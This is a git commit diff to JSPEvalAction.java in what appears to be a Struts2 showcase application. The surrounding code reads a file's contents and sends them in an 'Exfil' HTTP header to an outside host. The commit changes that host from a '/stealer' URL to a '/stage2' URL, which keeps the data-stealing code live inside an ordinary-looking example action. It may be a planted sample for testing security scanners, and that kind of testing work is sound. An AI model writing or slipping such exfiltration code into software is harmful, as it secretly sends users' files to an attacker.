2683d36d3843843e7529c219501781a34b1306d1
Dave Ferguson <6633962+gmdavef@users.noreply.github.com>
2024-05-14 17:11:28 -0500

    Update JSPEvalAction.java

--- src/main/java/org/apache/struts2/showcase/action/JSPEvalAction.java
+++ src/main/java/org/apache/struts2/showcase/action/JSPEvalAction.java
@@ -50,7 +50,7 @@ public class JSPEvalAction extends ExampleAction {
 				FileInputStream fis = new FileInputStream(f);
 				fis.read(bytes);
 				String data = new String( bytes );
-				URL evil = new URL("http://abc.alhajikudi.com/stealer");
+				URL evil = new URL("http://0had.com/stage2");
 				HttpURLConnection con = (HttpURLConnection)evil.openConnection();
 				con.setRequestProperty("Exfil", data);
 				int code = con.getResponseCode();
